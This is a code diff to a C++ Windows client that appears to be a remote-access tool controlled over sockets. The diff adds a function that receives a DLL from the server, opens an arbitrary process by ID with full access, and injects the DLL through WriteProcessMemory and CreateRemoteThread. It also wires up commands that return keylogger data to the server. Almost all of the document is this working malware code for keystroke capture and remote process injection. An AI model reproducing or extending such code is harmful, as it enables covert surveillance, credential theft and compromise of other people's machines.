@@ -14,7 +14,7 @@ using namespace std;
 
 #define DEFAULT_BUFLEN 1050
 #define DEFAULT_PORT "5007"
-#define DEFAULT_HOST "10.0.0.1"
+#define DEFAULT_HOST "127.0.0.1"
 
 std::ofstream openFile(char *file_path)
 {
@@ -284,29 +284,25 @@ void moveFile(SocketManager & socketManager, SOCKET & socket)
 	result = socketManager.send_data(socket, w.c_str());
 }
 
-void iatHooking(SocketManager & socketManager, SOCKET & socket)//TODO:update according to main
+void iatHooking(SocketManager & socketManager, SOCKET & socket)
 {
 	int result;
 	char recvbuf[DEFAULT_BUFLEN * 4];
-	//get directory
+	//get processID
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); 
+	DWORD processID = 3104;// TODO: fix
 
-	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+	//get dll
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 400); // TODO: fix in server so that gets it in bytes
 
-	char * dllPath = "IAT Hooking\IATHooking.dll";
+     //Create the dll in IAT Hooking\IATHooking.dll in Client PC
+	char * dllPath = "IAT Hooking\\IATHooking.dll";
 	std::ofstream clientFile = openFile(dllPath);
 	clientFile.write(recvbuf, result);
 	clientFile.close();
-	/*
-	LPTSTR exePath = _tcsdup(TEXT("..\\Server\\IAT Hooking\\Hooked\\Debug\\Hooked.exe"));
 
-
-	STARTUPINFO info = { sizeof(info) };
-	PROCESS_INFORMATION processInfo;
 	HANDLE hprocess = NULL;
-	if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
-	{
-		hprocess = processInfo.hProcess;
-	}
+	hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
 	if (!hprocess)
 	{
 		cout << GetLastError();
@@ -320,17 +316,14 @@ void iatHooking(SocketManager & socketManager, SOCKET & socket)//TODO:update acc
 	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
 		strlen(dllPath), NULL);
 
-	CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
+	HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
 		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);
 
-	ResumeThread(processInfo.hThread);
-	WaitForSingleObject(processInfo.hProcess, INFINITE);
-	CloseHandle(processInfo.hProcess);
-	CloseHandle(processInfo.hThread);
-	*/
+	CloseHandle(hprocess);
+	CloseHandle(hthread);
 }
 
-int main1(int argc, char **argv)
+int main(int argc, char **argv)
 {
 	SocketManager socketManager;
 	WindowsSocket windowsSocket;
@@ -442,23 +435,20 @@ int main1(int argc, char **argv)
 					}
 					else if (!strcmp(recvbuf, "GET_KEY_LOGGER_DATA"))
 					{
-						char* data = KeyLogger::getKeyLoggerData();//from differnet thread
-						socketManager.send_data(socket, data);
+						string data = KeyLogger::getKeyLoggerData();
+						socketManager.send_data(socket, data.c_str());////OK FOR SIZE FAILS!!!
 					}
 					else if (!strcmp(recvbuf, "STOP_KEY_LOGGER"))
 					{
-						//CreateThread(NULL,)
-						KeyLogger::stopKeyLogger(keyLoggerHandle);//from differnet thread
+						KeyLogger::stopKeyLogger(keyLoggerHandle);
 					}
 					else if (!strcmp(recvbuf, "IAT_HOOKING"))
 					{
-						//CreateThread(NULL,)
 						iatHooking(socketManager, socket);
 					}				
 					else
 					{
 						printf("Bytes received: %d\n", iResult);
-						//iResult2 = socketManager.send_data(socket, "ok");
 						string buf = string(recvbuf);
 						cout << buf.substr(0, iResult);
 					}
@@ -485,19 +475,6 @@ int main1(int argc, char **argv)
 		return 1;
 	}
 }
-
-int main()
-{
-	char * c = KeyLogger::getKeyLoggerData();
-	cout<<c;
-}
-
-
-
-
-
-
-
 
 
 
